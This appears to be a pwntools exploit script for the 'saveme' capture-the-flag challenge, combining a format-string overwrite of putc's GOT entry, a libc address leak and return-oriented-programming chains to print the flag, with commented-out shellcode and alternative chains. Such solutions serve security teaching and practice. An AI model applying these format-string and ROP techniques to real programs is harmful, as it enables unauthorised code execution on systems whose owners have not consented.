from pwn import *

exe = context.binary = ELF('./saveme_patched', checksec=False)
r = process(exe.path)
# gdb.attach(r, api=True, gdbscript='''
#            b*0x4014c3
#            b*0x40150c
#            b*0x40151d
#            b*0x401531
#         #    c
#         #    c
#         #    c
#         #    c
#         #    c
#         #    c
#         #    si
#         #    ni 7
#            ''')

#r = remote(b'challs.ctf.sekai.team', 4001)
printf_flag = 0x401515
pop_rdx_off = 0x0000000000119241
putc_got = 0x404070
loop = 0x4014E8
pop_5 = 0x4015b3
flag = 0x403960
name = 0x402008
libc_start_main_off = 0x23fc0
mmap = 0x00405000
pop_rdi_off = 0x0000000000023b72
#open = 0x401100
pop_rsi_off = 0x000000000002604f
read_ = 0x4010d0
malloc_off = 0x000000000009a110
puts = 0x401050
sub_rax_rdi_off = 0xb1d78

r.recvuntil(b'gift: ')
out = r.recvuntil(b'0 ')
stack = int(out.split(b' ')[0], 16)
print(hex(stack))

#payload = b'%21$pabc%5533c%11$hnaaaa' + p64(putc_got) + p64(pop_5) + p64(stack) + 4* p64(0) +    p64(loop)
payload = b'%5554c%10$hn%21$' + p64(putc_got) + p64(pop_5) + p64(stack + 120 + 0x60) + 4*p64(0) +  p64(loop)

#payload = b'%4199854c%10$naa' + p64(putc_got) + p64(putc_got+1)
r.sendlineafter(b'option: ', b'2')
r.sendlineafter(b'person: ', payload)

r.recvuntil(b'Q')
out = r.recvuntil(b'0b3')
print(out)

libc_start_main_ret = int(out, 16)
libc_base = libc_start_main_ret - 243 - libc_start_main_off
pop_rdi = libc_base + pop_rdi_off
pop_rdx = pop_rdx_off + libc_base
pop_rsi = pop_rsi_off + libc_base
malloc = libc_base + malloc_off
sub_rax_rdi = libc_base + sub_rax_rdi_off

print('libc_base:' + str(hex(libc_base)))

payload = flat(
    pop_rdi, 0,
    pop_rsi, stack + 184,
    pop_rdx, 0x100, 0,
    read_
)
r.sendlineafter(b'person: ', payload)
#shellcode = b"\x48\x8D\xB0\xF0\xEB\xFF\xFF\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05"

# payload = flat(
#     pop_rdi, name,
#     puts,
#     pop_rdi, 0,
#     pop_rsi, mmap,
#     pop_rdx, 0x100, 0,
#     read_,
#     pop_rdi, 0x1,
#     malloc,
#     mmap
# )

payload = flat(
    pop_rdi, 0x1,
    malloc,
    pop_rdi, 0x1410,
    sub_rax_rdi,
    printf_flag
)

r.send(payload)
print(r.recv())
# r.sendafter(b'flag.txt', shellcode)

r.interactive()